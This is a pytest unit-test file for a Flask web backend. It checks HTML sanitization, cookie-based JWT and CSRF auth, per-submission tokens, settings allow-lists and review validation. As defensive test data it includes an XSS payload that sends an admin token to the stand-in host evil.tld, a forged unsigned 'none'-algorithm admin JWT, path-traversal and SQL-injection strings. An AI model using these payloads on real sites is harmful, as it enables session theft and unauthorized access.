"""
Unit tests — exercise the new auth + sanitization code paths in isolation.

These tests do NOT require a running backend or a database. They use Flask's
test client and monkeypatch the model layer where DB access would be needed.

Run with:
    cd webdev/backend
    venv/Scripts/pytest tests/test_unit_security.py -v
"""
import os
import sys

# JWT_SECRET must be present before any module under test imports it.
os.environ.setdefault("JWT_SECRET", "unit-test-secret-do-not-use-in-prod")
os.environ.setdefault("JWT_REFRESH_SECRET", "unit-test-refresh-secret")

# Make backend/ importable when running from the repo root or from backend/.
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(_HERE))

import jwt
import pytest
from flask import Flask, jsonify


# ---------------------------------------------------------------------------
# A. Validators — clean_text strips HTML / control chars
# ---------------------------------------------------------------------------

class TestCleanText:

    def test_strips_script_tag(self):
        from utils.validators import clean_text
        out = clean_text("<script>alert(1)</script>hello")
        assert "<script>" not in out
        assert "alert" in out  # plain text remains

    def test_strips_svg_onload(self):
        """The exact payload NULLPOINT used."""
        from utils.validators import clean_text
        out = clean_text("<svg/onload=location='//evil.tld?t='+localStorage.admin_token>")
        assert "<svg" not in out
        assert "onload=" not in out

    def test_strips_img_onerror(self):
        from utils.validators import clean_text
        out = clean_text("<img src=x onerror=alert(1)>")
        assert "<img" not in out
        assert "onerror=" not in out

    def test_strips_null_byte(self):
        from utils.validators import clean_text
        out = clean_text("foo\x00bar")
        assert "\x00" not in out
        assert out == "foobar"

    def test_strips_control_chars_keeps_tab_newline(self):
        from utils.validators import clean_text
        out = clean_text("a\x01b\x02\tc\nd")
        assert "\x01" not in out
        assert "\x02" not in out
        assert "\t" in out
        assert "\n" in out

    def test_truncates_to_max_len(self):
        from utils.validators import clean_text
        out = clean_text("x" * 1000, max_len=50)
        assert len(out) == 50

    def test_none_returns_empty(self):
        from utils.validators import clean_text
        assert clean_text(None) == ""

    def test_clean_optional_returns_none_for_empty(self):
        from utils.validators import clean_optional
        assert clean_optional("") is None
        assert clean_optional("   ") is None
        # After stripping HTML, only whitespace remains → None
        assert clean_optional("<script></script>") is None


# ---------------------------------------------------------------------------
# B. Admin middleware — cookie auth + CSRF double-submit
# ---------------------------------------------------------------------------

@pytest.fixture
def app_with_admin_route(monkeypatch):
    """Tiny Flask app exposing one admin-required GET and one POST."""
    from middleware import admin_middleware

    app = Flask(__name__)

    @app.get("/protected")
    @admin_middleware.admin_required
    def protected_get():
        return jsonify({"ok": True})

    @app.post("/protected")
    @admin_middleware.admin_required
    def protected_post():
        return jsonify({"ok": True})

    return app


def _admin_jwt():
    return jwt.encode({"role": "admin"}, os.environ["JWT_SECRET"], algorithm="HS256")


def _user_jwt():
    return jwt.encode({"role": "user"}, os.environ["JWT_SECRET"], algorithm="HS256")


class TestAdminMiddleware:

    def test_no_cookie_returns_401(self, app_with_admin_route):
        c = app_with_admin_route.test_client()
        r = c.get("/protected")
        assert r.status_code == 401

    def test_bearer_header_no_longer_accepted(self, app_with_admin_route):
        """Old Bearer-header path must be rejected after the cookie migration."""
        c = app_with_admin_route.test_client()
        r = c.get("/protected", headers={"Authorization": f"Bearer {_admin_jwt()}"})
        assert r.status_code == 401

    def test_cookie_jwt_grants_get(self, app_with_admin_route):
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        r = c.get("/protected")
        assert r.status_code == 200

    def test_cookie_user_role_returns_403(self, app_with_admin_route):
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_user_jwt(), domain="localhost")
        r = c.get("/protected")
        assert r.status_code == 403

    def test_post_without_csrf_returns_403(self, app_with_admin_route):
        """Cookie auth alone is NOT enough for unsafe methods."""
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        r = c.post("/protected")
        assert r.status_code == 403
        assert "CSRF" in r.get_json()["error"]

    def test_post_with_mismatched_csrf_returns_403(self, app_with_admin_route):
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="cookie-value", domain="localhost")
        r = c.post("/protected", headers={"X-CSRF-Token": "header-value"})
        assert r.status_code == 403

    def test_post_with_matching_csrf_grants(self, app_with_admin_route):
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="match", domain="localhost")
        r = c.post("/protected", headers={"X-CSRF-Token": "match"})
        assert r.status_code == 200

    def test_empty_csrf_pair_rejected(self, app_with_admin_route):
        """Both empty strings must NOT pass — guards against `'' == ''` shortcut."""
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="", domain="localhost")
        r = c.post("/protected", headers={"X-CSRF-Token": ""})
        assert r.status_code == 403

    def test_expired_jwt_returns_401(self, app_with_admin_route):
        from datetime import datetime, timedelta, timezone
        expired = jwt.encode(
            {"role": "admin", "exp": datetime.now(timezone.utc) - timedelta(hours=1)},
            os.environ["JWT_SECRET"], algorithm="HS256",
        )
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=expired, domain="localhost")
        r = c.get("/protected")
        assert r.status_code == 401

    def test_jwt_signed_with_wrong_secret_rejected(self, app_with_admin_route):
        bad = jwt.encode({"role": "admin"}, "different-secret", algorithm="HS256")
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=bad, domain="localhost")
        r = c.get("/protected")
        assert r.status_code == 401

    def test_jwt_none_alg_rejected(self, app_with_admin_route):
        """JWT 'none' algorithm attack — payload pretends to be admin, no signature."""
        import base64
        header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(b'{"role":"admin","exp":9999999999}').rstrip(b"=").decode()
        none_token = f"{header}.{payload}."
        c = app_with_admin_route.test_client()
        c.set_cookie(key="admin_session", value=none_token, domain="localhost")
        r = c.get("/protected")
        assert r.status_code == 401


# ---------------------------------------------------------------------------
# C. Submission-owner middleware — opaque token gate
# ---------------------------------------------------------------------------

@pytest.fixture
def app_with_submission_route(monkeypatch):
    from middleware import admin_middleware
    # Patch the DB-touching helper so the test runs without Postgres.
    fake_db = {1: "valid-token-for-1", 2: "valid-token-for-2"}

    def fake_find(sub_id, token):
        return sub_id if fake_db.get(sub_id) == token else None

    monkeypatch.setattr(
        "models.submission.Submission.find_id_by_token",
        staticmethod(fake_find),
    )

    app = Flask(__name__)

    @app.patch("/sub/<int:sub_id>")
    @admin_middleware.submission_owner_or_admin
    def patch_sub(sub_id):
        return jsonify({"ok": True, "sub_id": sub_id})

    return app


class TestSubmissionOwnerMiddleware:

    def test_no_token_returns_401(self, app_with_submission_route):
        c = app_with_submission_route.test_client()
        r = c.patch("/sub/1")
        assert r.status_code == 401

    def test_wrong_token_returns_403(self, app_with_submission_route):
        c = app_with_submission_route.test_client()
        r = c.patch("/sub/1", headers={"X-Submission-Token": "wrong"})
        assert r.status_code == 403

    def test_token_for_other_submission_returns_403(self, app_with_submission_route):
        """Token valid for sub 2 must NOT work on sub 1 (BOLA fix)."""
        c = app_with_submission_route.test_client()
        r = c.patch("/sub/1", headers={"X-Submission-Token": "valid-token-for-2"})
        assert r.status_code == 403

    def test_correct_token_grants(self, app_with_submission_route):
        c = app_with_submission_route.test_client()
        r = c.patch("/sub/1", headers={"X-Submission-Token": "valid-token-for-1"})
        assert r.status_code == 200

    def test_admin_cookie_grants_without_token(self, app_with_submission_route):
        """Admin overrides — useful for admin-initiated edits."""
        c = app_with_submission_route.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        r = c.patch("/sub/1")
        assert r.status_code == 200

    def test_unknown_submission_returns_403_not_404(self, app_with_submission_route):
        """Same status for "wrong token" and "unknown id" — no enumeration."""
        c = app_with_submission_route.test_client()
        r = c.patch("/sub/999999", headers={"X-Submission-Token": "anything"})
        assert r.status_code == 403


# ---------------------------------------------------------------------------
# D. Submission token generator — uniqueness & length
# ---------------------------------------------------------------------------

class TestSubmissionToken:

    def test_token_is_url_safe_and_long_enough(self):
        from models.submission import _new_submission_token
        t = _new_submission_token()
        # 32 random bytes → ~43 char base64url
        assert len(t) >= 32
        # URL-safe characters only
        import re
        assert re.match(r"^[A-Za-z0-9_-]+$", t)

    def test_tokens_are_unique(self):
        from models.submission import _new_submission_token
        tokens = {_new_submission_token() for _ in range(1000)}
        assert len(tokens) == 1000  # extremely unlikely to collide


# ---------------------------------------------------------------------------
# E. Site settings — public read, admin-gated write, key allow-list
# ---------------------------------------------------------------------------

@pytest.fixture
def app_with_site_settings(monkeypatch):
    """Flask app with the site-settings blueprints + monkeypatched DB layer."""
    from routes import site_settings as ss

    store = {}  # in-memory stand-in for the site_settings table
    known_slugs = {"bizcheck", "premium-audit"}

    monkeypatch.setattr(ss.SiteSettings, "get_all", staticmethod(lambda: dict(store)))
    monkeypatch.setattr(ss.SiteSettings, "set", staticmethod(lambda k, v: store.__setitem__(k, v)))
    monkeypatch.setattr(
        ss.Test, "find_by_slug",
        staticmethod(lambda slug: {"id": 1, "slug": slug} if slug in known_slugs else None),
    )

    app = Flask(__name__)
    app.register_blueprint(ss.site_settings_bp)
    app.register_blueprint(ss.admin_site_settings_bp)
    return app, store


class TestSiteSettings:

    BASE = "/api_crowe_bizcheck"

    def test_public_get_needs_no_auth(self, app_with_site_settings):
        app, store = app_with_site_settings
        store["cta_hero_test"] = "bizcheck"
        c = app.test_client()
        r = c.get(f"{self.BASE}/site-settings")
        assert r.status_code == 200
        body = r.get_json()["settings"]
        # All three keys always present, missing ones default to "".
        assert body["cta_hero_test"] == "bizcheck"
        assert body["cta_about_test"] == ""
        assert body["cta_final_test"] == ""

    def test_admin_get_requires_cookie(self, app_with_site_settings):
        app, _ = app_with_site_settings
        c = app.test_client()
        r = c.get(f"{self.BASE}/admin/site-settings")
        assert r.status_code == 401

    def test_admin_put_requires_cookie(self, app_with_site_settings):
        app, _ = app_with_site_settings
        c = app.test_client()
        r = c.put(f"{self.BASE}/admin/site-settings", json={"cta_hero_test": "bizcheck"})
        assert r.status_code == 401

    def test_admin_put_requires_csrf(self, app_with_site_settings):
        app, _ = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        r = c.put(f"{self.BASE}/admin/site-settings", json={"cta_hero_test": "bizcheck"})
        assert r.status_code == 403  # cookie alone is not enough for a write

    def test_admin_put_valid_slug_persists(self, app_with_site_settings):
        app, store = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        r = c.put(
            f"{self.BASE}/admin/site-settings",
            json={"cta_hero_test": "bizcheck"},
            headers={"X-CSRF-Token": "tok"},
        )
        assert r.status_code == 200
        assert store["cta_hero_test"] == "bizcheck"

    def test_admin_put_unknown_slug_rejected(self, app_with_site_settings):
        app, store = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        r = c.put(
            f"{self.BASE}/admin/site-settings",
            json={"cta_hero_test": "no-such-test"},
            headers={"X-CSRF-Token": "tok"},
        )
        assert r.status_code == 400
        assert store == {}  # all-or-nothing: nothing written

    def test_admin_put_malicious_slug_rejected(self, app_with_site_settings):
        """clean_slug must reject path traversal / SQL-ish payloads."""
        app, store = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        for bad in ["../../etc/passwd", "bizcheck; DROP TABLE tests", "<script>", "a b c"]:
            r = c.put(
                f"{self.BASE}/admin/site-settings",
                json={"cta_hero_test": bad},
                headers={"X-CSRF-Token": "tok"},
            )
            assert r.status_code == 400, f"slug {bad!r} should be rejected"
        assert store == {}

    def test_admin_put_ignores_non_allowlisted_keys(self, app_with_site_settings):
        """Keys outside CTA_KEYS must never reach the DB (mass-assignment guard)."""
        app, store = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        r = c.put(
            f"{self.BASE}/admin/site-settings",
            json={"is_admin": "true", "jwt_secret": "leak", "cta_hero_test": "bizcheck"},
            headers={"X-CSRF-Token": "tok"},
        )
        assert r.status_code == 200
        assert set(store.keys()) == {"cta_hero_test"}  # only the allow-listed key landed

    def test_admin_put_empty_value_clears_target(self, app_with_site_settings):
        app, store = app_with_site_settings
        store["cta_hero_test"] = "bizcheck"
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        r = c.put(
            f"{self.BASE}/admin/site-settings",
            json={"cta_hero_test": ""},
            headers={"X-CSRF-Token": "tok"},
        )
        assert r.status_code == 200
        assert store["cta_hero_test"] == ""

    def test_public_get_defaults_email_flag_off(self, app_with_site_settings):
        app, _ = app_with_site_settings
        c = app.test_client()
        r = c.get(f"{self.BASE}/site-settings")
        # Email delivery is OFF by default until the admin enables it.
        assert r.get_json()["settings"]["email_delivery_enabled"] == "0"

    def test_admin_put_email_flag_toggles_on(self, app_with_site_settings):
        app, store = app_with_site_settings
        c = app.test_client()
        c.set_cookie(key="admin_session", value=_admin_jwt(), domain="localhost")
        c.set_cookie(key="admin_csrf", value="tok", domain="localhost")
        r = c.put(
            f"{self.BASE}/admin/site-settings",
            json={"email_delivery_enabled": True},
            headers={"X-CSRF-Token": "tok"},
        )
        assert r.status_code == 200
        assert store["email_delivery_enabled"] == "1"        # stored as "1"
        # Public GET now reflects the enabled flag.
        r2 = c.get(f"{self.BASE}/site-settings")
        assert r2.get_json()["settings"]["email_delivery_enabled"] == "1"


# ---------------------------------------------------------------------------
# F. POST /submissions must return submission_token (regression guard)
# ---------------------------------------------------------------------------

@pytest.fixture
def app_with_submissions_create(monkeypatch):
    """POST /api/submissions route with the service layer stubbed.

    Reproduces the bug where the language-patch step stripped submission_token
    out of the create response, leaving the client unable to authenticate any
    subsequent PATCH/PDF call (401 forever).
    """
    from routes import submissions as subs_route

    def fake_create(first, last, email, phone, consent, test_id=None, test_slug=None):
        # Mirrors what Submission.create returns when RETURNING _SELECT_COLS_WITH_TOKEN.
        return {
            "id": 999,
            "test_id": test_id,
            "first_name": first, "last_name": last, "email": email, "phone": phone,
            "consent": consent, "status": "started",
            "language": "ro",
            "submission_token": "FAKE-TOKEN-XYZ",
            "created_at": "2026-01-01T00:00:00",
        }

    def fake_update(sub_id, data):
        # Mirrors Submission.update — RETURNING _SELECT_COLS, NO submission_token.
        return {
            "id": sub_id,
            "test_id": None,
            "first_name": None, "last_name": None, "email": None, "phone": None,
            "consent": False, "status": "started",
            "language": data.get("language", "ro"),
            "created_at": "2026-01-01T00:00:00",
            # NOTE: deliberately omitting submission_token — the route layer
            # must merge it back in from the create result.
        }

    monkeypatch.setattr(subs_route, "create_submission", fake_create)
    monkeypatch.setattr(subs_route, "update_submission", fake_update)

    app = Flask(__name__)
    app.register_blueprint(subs_route.submissions_bp)
    return app


class TestSubmissionCreateResponse:

    def test_create_response_includes_token(self, app_with_submissions_create):
        c = app_with_submissions_create.test_client()
        r = c.post(
            "/api_crowe_bizcheck/submissions",
            json={"language": "ro", "consent": False},
        )
        assert r.status_code == 201
        body = r.get_json()
        # If this assertion fails, the SPA cannot authenticate further calls.
        assert body["submission"].get("submission_token") == "FAKE-TOKEN-XYZ", (
            "POST /submissions response must include submission_token even when "
            "the route immediately patches the language afterwards."
        )


# ---------------------------------------------------------------------------
# G. End-to-end: create → PATCH → PDF upload with the token from create
#    Reproduces the exact production flow that was breaking with 401s.
# ---------------------------------------------------------------------------

@pytest.fixture
def app_full_submission_flow(monkeypatch):
    """Wires the create endpoint to a shared in-memory store so the
    submission_owner_or_admin decorator can validate the same token a real
    server would issue at POST /submissions."""
    from routes import submissions as subs_route
    from middleware import admin_middleware

    store = {}  # sub_id -> token
    next_id = [1000]

    def fake_create(first, last, email, phone, consent, test_id=None, test_slug=None):
        sid = next_id[0]; next_id[0] += 1
        token = "TOK-{:04d}-XYZ".format(sid)
        store[sid] = token
        return {
            "id": sid, "submission_token": token, "language": "ro",
            "first_name": first, "last_name": last, "email": email, "phone": phone,
            "consent": consent, "status": "started", "created_at": "2026-01-01",
        }

    def fake_update(sub_id, data):
        # NO token in this row (mirrors _SELECT_COLS).
        return {
            "id": sub_id, "language": data.get("language", "ro"),
            "status": data.get("status", "started"),
            "first_name": None, "last_name": None, "email": None, "phone": None,
            "consent": False, "created_at": "2026-01-01",
        }

    def fake_get_detail(sub_id):
        if sub_id not in store:
            raise ValueError("not found")
        return {"id": sub_id, "email": "x@y.com", "language": "ro"}

    def fake_save_pdf(sub_id, pdf_bytes):
        return None  # success no-op

    monkeypatch.setattr(subs_route, "create_submission", fake_create)
    monkeypatch.setattr(subs_route, "update_submission", fake_update)
    monkeypatch.setattr(subs_route, "get_submission_detail", fake_get_detail)
    monkeypatch.setattr(subs_route, "save_submission_pdf", fake_save_pdf)
    monkeypatch.setattr(
        "models.submission.Submission.find_id_by_token",
        staticmethod(lambda sid, tok: sid if store.get(sid) == tok else None),
    )
    # `submission_owner_or_admin` imports Submission lazily; patch the symbol
    # the decorator actually resolves at call time.
    monkeypatch.setattr(admin_middleware, "_is_valid_admin_jwt", lambda: False)

    app = Flask(__name__)
    app.register_blueprint(subs_route.submissions_bp)
    return app, store


class TestPdfUploadEndToEnd:
    """The exact failure mode that produced the user's 401 wall."""

    BASE = "/api_crowe_bizcheck/submissions"

    def test_pdf_upload_with_token_from_create_succeeds(self, app_full_submission_flow):
        app, _ = app_full_submission_flow
        c = app.test_client()

        # 1) Create — SPA receives id + token in the response body.
        r = c.post(self.BASE, json={"language": "ro", "consent": False})
        assert r.status_code == 201
        sub = r.get_json()["submission"]
        sub_id, token = sub["id"], sub["submission_token"]
        assert token, "create response must surface the token"

        # 2) Upload PDF — same token must authenticate this call.
        import base64
        pdf_bytes = b"%PDF-1.4\n%fake-but-valid-magic\n%%EOF"
        pdf_b64 = base64.b64encode(pdf_bytes).decode()
        r = c.post(
            f"{self.BASE}/{sub_id}/pdf",
            json={"pdf": pdf_b64},
            headers={"X-Submission-Token": token},
        )
        assert r.status_code == 200, (
            f"PDF upload should succeed with the token from create, got {r.status_code} {r.get_data(as_text=True)}"
        )

    def test_pdf_upload_without_token_returns_401(self, app_full_submission_flow):
        app, _ = app_full_submission_flow
        c = app.test_client()
        r = c.post(self.BASE, json={"language": "ro"})
        sub_id = r.get_json()["submission"]["id"]
        # Same as before the fix: no header → no PDF saved.
        r = c.post(f"{self.BASE}/{sub_id}/pdf", json={"pdf": "x"})
        assert r.status_code == 401


# ---------------------------------------------------------------------------
# H. Sales Telegram notification — gating + fire-once
# ---------------------------------------------------------------------------

class TestSalesNotify:

    def _setup(self, monkeypatch, sub, *, claim_ok=True, configured=True):
        import services.sales_notify as sn
        sent = []
        monkeypatch.setattr(sn, "_configured", lambda: configured)
        monkeypatch.setattr("models.submission.Submission.find_by_id", staticmethod(lambda i: sub))
        monkeypatch.setattr("models.submission.Submission.get_pdf", staticmethod(lambda i: None))
        monkeypatch.setattr("models.submission.Submission.claim_sales_notification",
                            staticmethod(lambda i: i if claim_ok else None))
        # When the claim is lost (already notified), maybe_notify_sales tries to
        # edit the existing message — stub the lookup so the test never hits the DB.
        monkeypatch.setattr("models.submission.Submission.get_sales_message", staticmethod(lambda i: None))
        monkeypatch.setattr("models.test.Test.find_by_id", staticmethod(lambda i: {"name_ro": "Bizcheck"}))
        # Capture instead of spawning a real thread / hitting Telegram.
        monkeypatch.setattr(sn.threading, "Thread",
                            lambda *a, **k: type("T", (), {"start": lambda self: sent.append(k.get("args"))})())
        return sn, sent

    def test_skips_when_incomplete_lead(self, monkeypatch):
        sub = {"id": 1, "first_name": None, "last_name": None, "email": None, "phone": None, "tg_chat_id": None}
        sn, sent = self._setup(monkeypatch, sub)
        sn.maybe_notify_sales(1)
        assert sent == []  # no name/contact → no notification

    def test_sends_when_name_and_phone(self, monkeypatch):
        sub = {"id": 2, "first_name": "Ion", "last_name": "P", "email": None, "phone": "+37379027317",
               "tg_chat_id": None, "tg_username": None, "total_score": 70, "test_id": 1, "created_at": "2026-01-01"}
        sn, sent = self._setup(monkeypatch, sub)
        sn.maybe_notify_sales(2)
        assert len(sent) == 1

    def test_fire_once_when_already_claimed(self, monkeypatch):
        sub = {"id": 3, "first_name": "Ana", "email": "a@b.md", "phone": None,
               "tg_chat_id": None, "total_score": 90, "test_id": 1, "created_at": "x"}
        sn, sent = self._setup(monkeypatch, sub, claim_ok=False)
        sn.maybe_notify_sales(3)
        assert sent == []  # claimed already + no known message → nothing to do

    def test_updates_existing_message_when_already_claimed(self, monkeypatch):
        """Already notified, but we know the message id → edit it in place
        (e.g. email/phone left in the bot after the first notification)."""
        sub = {"id": 5, "first_name": "Ana", "last_name": "P", "email": "a@b.md",
               "phone": "+37379027317", "tg_chat_id": None, "tg_username": None,
               "total_score": 80, "test_id": 1, "created_at": "x"}
        sn, sent = self._setup(monkeypatch, sub, claim_ok=False)
        monkeypatch.setattr("models.submission.Submission.get_sales_message",
                            staticmethod(lambda i: (123, True)))
        sn.maybe_notify_sales(5)
        assert len(sent) == 1  # update thread started with the edit payload

    def test_skips_when_not_configured(self, monkeypatch):
        sub = {"id": 4, "first_name": "Ana", "phone": "+373", "email": None, "tg_chat_id": None}
        sn, sent = self._setup(monkeypatch, sub, configured=False)
        sn.maybe_notify_sales(4)
        assert sent == []  # no SALES_BOT_TOKEN → disabled


# ---------------------------------------------------------------------------
# I. Input validation — malformed test_id must return 400, never 500
# ---------------------------------------------------------------------------

class TestTestIdValidation:
    """A bad test_id used to reach the DB and raise HTTP 500 (input-validation
    finding). It must now be rejected cleanly with 400."""

    BASE = "/api_crowe_bizcheck/submissions"

    def test_malformed_test_id_returns_400_not_500(self, app_with_submissions_create):
        c = app_with_submissions_create.test_client()
        r = c.post(self.BASE, json={"test_id": "not-an-int", "consent": False})
        assert r.status_code == 400
        assert "test_id" in r.get_data(as_text=True).lower()

    def test_list_test_id_returns_400(self, app_with_submissions_create):
        c = app_with_submissions_create.test_client()
        r = c.post(self.BASE, json={"test_id": [1, 2, 3]})
        assert r.status_code == 400

    def test_integer_test_id_accepted(self, app_with_submissions_create):
        c = app_with_submissions_create.test_client()
        r = c.post(self.BASE, json={"test_id": 5, "language": "ro"})
        assert r.status_code == 201

    def test_numeric_string_test_id_accepted(self, app_with_submissions_create):
        c = app_with_submissions_create.test_client()
        r = c.post(self.BASE, json={"test_id": "5"})
        assert r.status_code == 201


# ---------------------------------------------------------------------------
# J. Numeric / language validators (rating, lang)
# ---------------------------------------------------------------------------

class TestNumericAndLangValidators:

    def test_clean_float_clamps_and_snaps(self):
        from utils.validators import clean_float
        assert clean_float(4.4, min_value=1, max_value=5, step=0.5) == 4.5
        assert clean_float(99, min_value=1, max_value=5, step=0.5) == 5
        assert clean_float(-3, min_value=1, max_value=5, step=0.5) == 1

    def test_clean_float_rejects_garbage(self):
        from utils.validators import clean_float
        import pytest
        for bad in ["abc", None, "nan", float("inf")]:
            with pytest.raises(ValueError):
                clean_float(bad, min_value=1, max_value=5)

    def test_clean_lang_whitelist(self):
        from utils.validators import clean_lang
        assert clean_lang("ru") == "ru"
        assert clean_lang("RO") == "ro"
        assert clean_lang("en") == "ro"       # unknown → default
        assert clean_lang("<script>") == "ro"
        assert clean_lang(None) == "ro"


# ---------------------------------------------------------------------------
# K. Public review submission — validation, sanitization, single-language
# ---------------------------------------------------------------------------

@pytest.fixture
def app_with_public_reviews(monkeypatch):
    """Public POST /testimonials with the model layer stubbed (no DB)."""
    from routes import content as content_route

    saved = []

    def fake_create_public(name, role, quote, rating, lang):
        row = {
            "id": len(saved) + 1, "name": name, "role": role,
            "quote_ro": quote if lang == "ro" else "",
            "quote_ru": quote if lang == "ru" else "",
            "rating": rating, "avatar_url": None, "order_index": 0,
            "is_active": True, "lang": lang, "is_user_submitted": True,
            "created_at": "2026-01-01",
        }
        saved.append(row)
        return row

    monkeypatch.setattr(content_route.Testimonial, "create_public",
                        staticmethod(fake_create_public))

    app = Flask(__name__)
    app.register_blueprint(content_route.content_bp)
    return app, saved


class TestPublicReviewSubmit:

    URL = "/api_crowe_bizcheck/testimonials"

    def test_valid_review_is_created(self, app_with_public_reviews):
        app, saved = app_with_public_reviews
        c = app.test_client()
        r = c.post(self.URL, json={"name": "Vlad R.", "quote": "Foarte util!", "rating": 5, "lang": "ro"})
        assert r.status_code == 201
        row = r.get_json()["testimonial"]
        assert row["is_user_submitted"] is True
        assert row["quote_ro"] == "Foarte util!" and row["quote_ru"] == ""

    def test_review_stored_in_single_language(self, app_with_public_reviews):
        app, saved = app_with_public_reviews
        c = app.test_client()
        c.post(self.URL, json={"name": "Ион", "quote": "Отлично", "rating": 4, "lang": "ru"})
        assert saved[-1]["quote_ru"] == "Отлично" and saved[-1]["quote_ro"] == ""

    def test_missing_name_rejected(self, app_with_public_reviews):
        app, _ = app_with_public_reviews
        c = app.test_client()
        r = c.post(self.URL, json={"quote": "good enough", "rating": 5})
        assert r.status_code == 400

    def test_too_short_review_rejected(self, app_with_public_reviews):
        app, _ = app_with_public_reviews
        c = app.test_client()
        r = c.post(self.URL, json={"name": "Vlad", "quote": "x", "rating": 5})
        assert r.status_code == 400

    def test_html_in_review_is_stripped(self, app_with_public_reviews):
        app, saved = app_with_public_reviews
        c = app.test_client()
        r = c.post(self.URL, json={"name": "<b>Vlad</b>", "quote": "<script>alert(1)</script>great service", "rating": 5})
        assert r.status_code == 201
        assert "<script>" not in saved[-1]["quote_ro"]
        assert "<b>" not in saved[-1]["name"]

    def test_forged_rating_is_clamped(self, app_with_public_reviews):
        app, saved = app_with_public_reviews
        c = app.test_client()
        r = c.post(self.URL, json={"name": "Vlad", "quote": "nice one", "rating": 999})
        assert r.status_code == 201
        assert saved[-1]["rating"] == 5  # clamped to max

    def test_unknown_lang_defaults_ro(self, app_with_public_reviews):
        app, saved = app_with_public_reviews
        c = app.test_client()
        c.post(self.URL, json={"name": "Vlad", "quote": "nice review", "rating": 5, "lang": "fr"})
        assert saved[-1]["lang"] == "ro"
